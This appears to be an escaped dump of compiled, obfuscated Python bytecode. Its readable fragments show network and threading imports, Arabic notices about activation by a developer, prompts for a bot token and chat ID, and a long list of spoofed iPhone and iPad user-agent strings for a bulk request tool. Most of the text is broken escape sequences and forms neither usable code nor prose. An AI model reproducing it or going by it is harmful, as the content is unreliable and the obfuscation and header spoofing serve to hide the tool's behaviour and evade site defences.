\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\016e\\\\\\\\031\\\\\\\\240\\\\\\\\305d\\\\\\\\240\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\024\\\\\\\\004\\\\\\\\000e|\\\\\\\\220\\\\\\\\006y\\\\\\\\306\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\016e\\\\\\\"\\\\\\\"\"\"\\\\\\\\031\\\\\\\\240\\\\\\\\305d\\\\\\\\241\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\024\\\\\\\\004\\\\\\\\000e|\\\\\\\\220\\\\\\\\006y\\\\\\\\352\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\016e\\\\\\\\031\\\\\\\\240\\\\\\\\036d\\\\\\\\242\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\024\\\\\\\\004\\\\\\\\000e|\\\\\\\\220\\\\\\\\007y\\\\\\\\016\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000""\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\016e\\\\\\\\031\\\\\\\\240\\\\\\\\036d\\\\\\\\243\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\024\\\\\\\\004\\\\\\\\000e|\\\\\\\\220\\\\\\\\007y2\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\016e\\\\\\\\031\\\\\\\\240\\\\\\\\036dV\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\024\\\\\\\\004\\\\\\\\000e|\\\\\\\\220\\\\\\\\007yV\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000e\\\\\\\\270\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000d\\\\\\\\003S\\\\\\\\000)\\\\\\\\244F\\\\\\\\351\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\351\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000N)\\\\\\\\001\\\\\\\\332\\\\\\\\022ThreadPoolExecutor)\\\\\\\\001\\\\\\\\332\\\\\\\\007urlopen)\\\\\\\\001\\\\\\\\332\\\\\\\\004path)\\\\\\\\001\\\\\\\\332\\\\\\\\006system)\\\\\\\\001\\\\\\\\332\\\\\\\\005uuid4)\\\\\\\\001\\\\\\\\332\\\\\\\\023generate_user_agent)\\\\\\\\001\\\\\\\\332\\\"\\\"\\\\\\\\005sleep)\\\\\\\\001\\\\\\\\332\\\\\\\\004date)\\\\\\\\001\\\\\\\\332\\\\\\\\006pretty)\\\\\\\\001\\\\\\\\332\\\\\\\\005print)\\\\\\\\001\\\\\\\\332\\\\\\\\004Tree)\\\\\\\\001\\\\\\\\332\\\\\\\\007Columns)\\\\\\\\001\\\\\\\\332\\\\\\\\010Markdown)\\\\\\\\001\\\\\\\\332\\\\\\\\005Panel)\\\\\\\\001\\\\\\\\332\\\\\\\\005Group)\\\\\\\\001\\\\\\\\332\\\\\\\\rBeautifulSoup)\\\\\\\\001\\\\\\\\332\\\\\\\\007Console)\\\\\\\\001\\\\\\\\332\\\\\\\\005Tablei\\\\\\\\350\\\\\\\\007\\\\\\\\000\\\\\\\\000\\\\\\\\351\\\\\\\\t\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\351\\\\\\\\n\\\\\\\\000\\\\\\\\000\\\\\\\\000u4\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\331\\\\\\\\210\\\\\\\\331\\\\\\\\202\\\\\\\\331\\\\\\\\201\\\\\\\\330\\\\\\\\252 \\\\\\\\330\\\\\\\\261\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\263\\\\\\\\331\\\\\\\\204 \\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\331\\\\\\\\205\\\\\\\\330""\\\\\\\\267\\\\\\\\331\\\\\\\\210\\\\\\\\330\\\\\\\\261 \\\\\\\\331\\\\\\\\204\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\252\\\\\\\\331\\\\\\\\201\\\\\\\\330\\\\\\\\271\\\\\\\\331\\\\\\\\212\\\\\\\\331\\\\\\\\204 @b_q_3z\\\\\\\\007\\\\\\\\033[1;31mz\\\\\\\\007\\\\\\\\033[1;33mz\\\\\\\\007\\\\\\\\033[2;32mz\\\\\\\\007\\\\\\\\033[1;97mz\\\\\\\\007\\\\\\\\033[2;36mz\\\\\\\\007\\\\\\\\033[1;34mz\\\\\\\\007\\\\\\\\033[1;32mz\\\\\\\\013\\\\\\\\033[38;5;208mz\\\\\\\\t\\\\\\\\033[38;5;5mz\"\"\\\\\\\\n\\\\\\\\033[38;5;13mz\\\\\\\\007\\\\\\\\033[1;30mz\\\\\\\\007\\\\\\\\033[1;37mz\\\\\\\\n\\\\\\\\033[38;5;52mz\\\\\\\\t\\\\\\\\033[38;5;8mz\\\\\\\\013\\\\\\\\033[38;5;220mz\\\\\\\\t\\\\\\\\033[38;5;7mz\\\\\\\\013\\\\\\\\033[38;5;153mz\\\\\\\\n\\\\\\\\033[38;5;18mz\\\\\\\\n\\\\\\\\033[38;5;48mz\\\\\\\\n\\\\\\\\033[38;5;22mz\\\\\\\\013\\\\\\\\033[38;5;196mz\\\\\\\\n\\\\\\\\033[38;5;88mz\\\\\\\\013\\\\\\\\033[38;5;226mz\\\\\\\\013\\\\\\\\033[38;5;136mz\\\\\\\\013\\\\\\\\033[38;5;216mz\\\\\\\\013\\\\\\\\033[38;5;166mz\\\\\\\\013\\\\\\\\033[38;5;234mz\\\\\\\\n\\\\\\\\033[38;5;91mz\\\\\\\\013\\\\\\\\033[38;5;205mz\\\\\\\\013\\\\\\\\033[38;5;161mz\\\\\\\\013\\\\\\\\033[38;5;236mz\\\\\\\\013\\\\\\\\033[38;5;233mz\\\\\\\\013\\\\\\\\033[38;5;255mz\\\\\\\\013\\\\\\\\033[38;5;231mz\\\\\\\\013\\\\\\\\033[38;5;180mz\\\\\\\\n\\\\\\\\033[38;5;94mz\\\\\\\\013\\\\\\\\033[38;5;252mz\\\\\\\\013\\\\\\\\033[38;5;246mz\\\\\\\\013\\\\\\\\033[38;5;228mz\\\\\\\\013\\\\\\\\033[38;5;172mz\\\\\\\\013\\\\\\\\033[38;5;188mz\\\\\\\\013\\\\\\\\033[38;5;247mz\\\\\\\\007\\\\\\\\033[0;34m\\\\\\\\332\\\\\\\\001\\\\\\\\ng333333\\\\\\\\323?)\\\\\\\\002\\\\\\\\332\\\\\\\\006render\\\\\\\\332\\\\\\\\003sayz\\\\\\\\031pip install python-cfonts\\\\\\\\372\\\\\\\\001 Z\\\\\\\\005white\\\\\\\\332\\\\\\\\003red\\\\\\\\332\\\\\\\\006center)\\\\\\\\002Z\\\\\\\\006colors\\\\\\\"\\\\\\\"Z\\\\\\\\005alignu'\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\330\\\\\\\\255\\\\\\\\330\\\\\\\\250\\\\\\\\331\\\\\\\\212 \\\\\\\\330\\\\\\\\252""\\\\\\\\330\\\\\\\\261\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257 \\\\\\\\330\\\\\\\\252\\\\\\\\330\\\\\\\\265\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257 \\\\\\\\330\\\\\\\\267\\\\\\\\330\\\\\\\\250\\\\\\\\331\\\\\\\\202 \\\\\\\\330\\\\\\\\264\\\\\\\\330\\\\\\\\261\\\\\\\\330\\\\\\\\255 u+\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\252 \\\\\\\\331\\\\\\\\205\\\\\\\\331\\\\\\\\206 \\\\\\\\331\\\\\\\\205\\\\\\\\331\\\\\\\\206\\\\\\\\330\\\\\\\\267\\\\\\\\331\\\\\\\\202\\\\\\\\330\\\\\\\\252\\\\\\\\331\\\\\\\\203 \\\\\\\\330\\\\\\\\254\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\261\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\206\\\\\\\\331\\\\\\\\203uB\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\331\\\\\\\\203\\\"\\\"\\\\\\\\331\\\\\\\\210\\\\\\\\331\\\\\\\\203\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\262\\\\\\\\331\\\\\\\\203 \\\\\\\\331\\\\\\\\205\\\\\\\\331\\\\\\\\206 \\\\\\\\330\\\\\\\\255\\\\\\\\330\\\\\\\\263\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\250\\\\\\\\331\\\\\\\\203 \\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\247 \\\\\\\\330\\\\\\\\252\\\\\\\\330\\\\\\\\263\\\\\\\\330\\\\\\\\252\\\\\\\\330\\\\\\\\256\\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\205 \\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\263\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\263\\\\\\\\331\\\\\\\\212 \"\"\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\250\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\271u\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\331\\\\\\\\205\\\\\\\\330\\\\\\\\267\\\\\\\\331\\\\\\\\210\\\\\\\\330\\\\\\\\261 \\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\212\\\\\\\\331\\\\\\\\201\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257 \\\\\\\\342\\\\\\\\234\\\\\\\\214\\\\\\\\360\\\\\\\\237\\\\\\\\230\\\\\\\\216u\\\\\\\\021\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\331\\\\\\\\202\\\\\\\\331\\\\\\\\206\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\252\\\\\\\\331""\\\\\\\\212 @v33ttzH-----------------------------------DAVID--------------------------------z\\\\\\\\037\\\\\\\\033[0;1m[ \\\\\\\\033[31;1m+ \\\\\\\\033[0;1m] TOK : z\\\\\\\\036\\\\\\\\033[0;1m[ \\\\\\\\033[31;1m+ \\\\\\\\033[0;1m] ID : \\\\\\\\332\\\\\\\\005clearu*\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\t\\\\\\\\342\\\\\\\\200\\\\\\\\242 Sedang Menginstall Modul Requests \\\\\\\\342\\\\\\\\200\\\\\\\\242)\\\\\\\\336\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CP\\\\\\\"\\\\\\\"U OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko)\\\"\\\" Version/5.0.2 Mobile/8J2 Safari/6533.18.5r!\\\\\\\\000\\\\\\\\000\\\\\\\\000\"\"\\\\\\\\372uMozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1\\\\\\\\372}Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533"".17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPadr\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5r \\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\210Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhoner$\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372uMozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\216Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_2 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7D11 Safari/528.16\\\\\\\\372tMozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18r&\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5r)\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\221Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7r*\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\227Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.\\\\\\\"\\\\\\\"5\\\\\\\\372}Mozilla/5.0 (iPad; ""U; CPU OS 4_3_5 like Mac OS X; nl-nl) AppleWebKit/5\"\"33.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad\\\\\\\\372Mozilla/5.0 \\\"\\\"(iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3\\\\\\\\372\\\\\\\\223Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; fr-fr) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7\\\\\\\\372bMozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313er$\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372}Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad\\\\\\\\372\\\\\\\\226Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\\\\\\\\372\\\\\\\\214Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r(\\\\\\\\000\\\\\\\\000\\\\\\\\000r0\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372}Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372uMozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1r \\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372kMozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313er6\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191\\\\\\\\372~Mozilla/5.0 (iPhone; CPU ""iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone\\\\\\\\372\\\\\\\\216Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Ver\"\"sion/4.0 Mobile/7E18 Safari/528.16r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\"\\\\\\\"\\\\\\\\212Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML,\\\"\\\" like Gecko) Mobile/8C148 Twitter for iPhoner;\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5\\\\\\\\372uMozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7r#\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r#\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\224Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372wMozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_6 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E200r'\\\\\\\\000\\\\\\\\000\\\\\\\\000r<\\\\\\\\000\\\\\\\\000\\\\\\\\000r!\\\\\\\\000\\\\\\\\000\\\\\\\\000r4\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r \\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\210Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3rB\\\\\\\\000\\\\\\\\000\\\\\\\\000r2\\\\\\\\000""\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000rB\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372}Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190 Twitter for iPadr*\\\\\\\\000\"\"\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\221Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7r!\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372xMozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; sv-se) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148ar$\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\"\\\"*\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2r2\\\\\\\\000\\\\\\\\000\\\\\\\\000r?\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372wMozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148rK\\\\\\\\000\\\\\\\\000\\\\\\\\000r&\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7r>\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000""\\\\\\\\000\\\\\\\\000\\\\\\\\372tMozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306r=\\\\\\\\000\\\\\\\\000\\\\\\\\000r6\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r;\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000r5\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\215Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5r;\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1\\\\\\\\372\\\\\\\\226Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, \"\"like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5\\\\\\\\372\\\\\\\\213Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5rR\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000r=\\\\\\\\000\\\\\\\\000\\\\\\\\000rR\\\\\\\\000\\\\\\\\000\\\\\\\\000rE\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\036\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372}Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad\\\\\\\\372lMozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1r)\\\\\\\\000\\\"\\\"\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000""\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\225Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) ,AppleWebKit/\\\\\\\"\\\\\\\"533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5r \\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000r)\\\\\\\\000\\\\\\\\000\\\\\\\\000r%\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\035\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372kMozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8Jr$\\\\\\\\000\\\\\\\\000\\\\\\\\000r$\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372uMozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) 